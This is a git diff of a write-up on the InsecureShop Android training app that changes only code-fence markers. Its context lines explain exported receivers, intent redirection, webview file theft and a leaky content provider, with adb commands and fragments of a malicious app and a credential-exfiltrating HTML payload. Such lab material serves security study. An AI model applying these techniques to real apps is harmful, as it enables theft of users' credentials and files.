@@ -13,7 +13,7 @@ draft: false
 ## Patched Target apk
 On later attacks, we will be performing data exfiltration against vulnerable webviews. However, the permissions on the original target application only allowed us to retrieve media files which doesn't really show the impact of the vuln. That's why I patched the application to add a single line in the manifest file:
 
-```xml=
+```xml
 android:requestLegacyExternalStorage="true"
 ```
 
@@ -36,7 +36,7 @@ When it receives a broadcast with the custom intent filter, the `CustomReceiver`
 > In case I haven't mentioned it yet on part 1, you'll be reading about intents a lot. Basically, intents are what allows different android app components to interact with each other. Read more about it from the [documentation](https://developer.android.com/guide/components/intents-filters)
 > 
 This is vulnerable since the activity + receiver being exported means that attackers can send a `com.insecureshop.CUSTOM_INTENT` broadcast and open up an attacker-controlled url/content. 
-```shell=
+```shell
 C:\Users\Pc\Downloads\InsecureShop-Writeup>adb shell am start -n com.insecureshop/.AboutUsActivity
 Starting: Intent { cmp=com.insecureshop/.AboutUsActivity }
 
@@ -49,7 +49,7 @@ Broadcast completed: result=0
 
 Reviewing the other methods defined in the AboutUs activity reveals another vulnerability regarding broadcasted intents:
 
-```kotlin=
+```kotlin
 
     public final void onSendData(View view) {
         Intrinsics.checkParameterIsNotNull(view, "view");
@@ -93,7 +93,7 @@ Before we begin to develop the malicious apk, readers might be curious on how we
 To exploit the vuln, we'll need to create our own malicious app and register a broadcast receiver that listens `com.insecureshop.action.BROADCAST`
 
 **AndroidManifest.xml**
-```xml=
+```xml
         <uses-permission android:name="android.permission.INTERNET"/>
         <receiver android:name=".InterceptBroadcast" android:exported="true">
             <intent-filter>
@@ -103,7 +103,7 @@ To exploit the vuln, we'll need to create our own malicious app and register a b
 ```
 
 **MainActivity.kt**
-```kotlin=
+```kotlin
 class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -118,7 +118,7 @@ class MainActivity : AppCompatActivity() {
 ```
 
 **InterceptBroadcast.kt**
-```kotlin=
+```kotlin
 class InterceptBroadcast : BroadcastReceiver() {
 
     override fun onReceive(context: Context?, intent: Intent?) {
@@ -157,7 +157,7 @@ From this point, what we can do is to find public exploits/vulnerability disclos
 ## Vulnerability #11: Intent Redirection (Access to Protected Components)
 Android components with the `android:exported='false'` attribute can only be accessible by the app itself and can not be launched by other applications. In addition to this, if a component declaration in the android manifest does not contain the `android:exported` attribute, then it is considered as not exported by default. If we attempt to start a non-exported activity/component, we would get the following error:
 
-```shell=
+```shell
 C:\Users\Pc\Downloads\InsecureShop-Writeup>adb shell am start -n com.insecureshop/.PrivateActivity
 Starting: Intent { cmp=com.insecureshop/.PrivateActivity }
 
@@ -187,7 +187,7 @@ java.lang.SecurityException: Permission Denial: starting Intent { flg=0x10000000
 Looking at the above code from `com.insecureshop.WebView2Activity` we see that the onCreate method checks first if it has received and intent that contains the parcelable extra, `extra_intent`. If it does, it starts the activity using the embedded intent. This is a dangerous pattern since it would allow malicious applications to start arbitrary components in the context of the vulnerable app. 
 
 **MainActivity.kt**
-```kotlin=
+```kotlin
 class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -223,7 +223,7 @@ Webviews are widely used in most android apps, but misconfigurations in these co
 This configuration is dangerous, since combining `javaScriptEnabled = true` + `allowUniversalAccessFromFileURLs = true` with the ability to load any arbitrary url can lead to the theft of arbitrary files:
 
 **pwned.html**
-```htmlembedded=
+```htmlembedded
 <html>
     <head>
     </head>
@@ -274,7 +274,7 @@ This configuration is dangerous, since combining `javaScriptEnabled = true` + `a
 The file above is the html code that will retrieve the contents of the vulnerable application's share preferences which contains user credentials and exfiltrates it to a remote server. Our code below will write the file into the device's sdcard directory then start up the vulnerable webview to load the payload file. 
 
 **MainActivity.kt**
-```kotlin=
+```kotlin
 class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -320,7 +320,7 @@ So, the workflow here is: user clicks on more info regarding a product -> launch
 The vulnerability here is that we can intercept the implicit intent in order to hijack the app's flow and display our own attacker page. This is a problem because when users click on the `more information` button, they are redirected to a possibly malicious page and they might trust this page since it was opened by the trusted insecureshop app. 
 
 **AndroidManifest.xml**
-```xml=
+```xml
 <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
 [...]        
 <activity
@@ -334,7 +334,7 @@ The vulnerability here is that we can intercept the implicit intent in order to 
 </activity>
 ```
 **MainActivity.kt**
-```kotlin=
+```kotlin
 class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -358,7 +358,7 @@ For this POC, we focused on intercepting the implicit activity start since we al
 
 In Android, Content Providers are a very important component that serves the purpose of a relational database to store the data of applications. Insecure implementations of an application's content provider could be a high-risk attack vector which could allow malicious applications to freely leak/retrieve data from it. While viewing the manifest for insecureshop, the content provider declaration sticks out as a red flag due to the exported attribute:
 
-```xml=
+```xml
 <provider android:name="com.insecureshop.contentProvider.InsecureShopProvider" 
           android:readPermission="com.insecureshop.permission.READ" 
           android:exported="true" 
@@ -367,7 +367,7 @@ In Android, Content Providers are a very important component that serves the pur
 
 This means that any application on the device can interact with the provider with the proper permissions (`com.insecureshop.permission.READ`). Next, we'll be looking at the source code for [com.insecureshop.contentProvider.InsecureShopProvider](https://github.com/hax0rgb/InsecureShop/blob/main/app/src/main/java/com/insecureshop/contentProvider/InsecureShopProvider.kt):
 
-```kotlin=
+```kotlin
 class InsecureShopProvider : ContentProvider() {
 
     companion object {
@@ -384,7 +384,7 @@ class InsecureShopProvider : ContentProvider() {
 
 within the onCreate method, we can see that the uriMatcher adds a URI which should be used to connect with the provider. In this instance, we will be using the following URI: `content://com.insecureshop.provider/insecure` 
 
-```kotlin=
+```kotlin
  override fun query(
         uri: Uri,
         projection: Array<out String>?,
@@ -425,14 +425,14 @@ within the onCreate method, we can see that the uriMatcher adds a URI which shou
 we can see that the `query` method is the only one with some code/logic on it. It creates a cursor with the `username` and `password` columns then populates them with the credentials from shared preferences.
 
 **AndroidManifest.xml**
-```xml=
+```xml
 <uses-permission android:name="com.insecureshop.permission.READ"/>
 ```
 
 In order to exploit this, we'll need to use the required permissions for the provider. After which, we can use a content resolver to query data from the content provider URI that we provide. If the query is succesful, we write the results into logcat. 
 
 **MainActivity.kt**
-```kotlin=
+```kotlin
     @SuppressLint("Range")
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
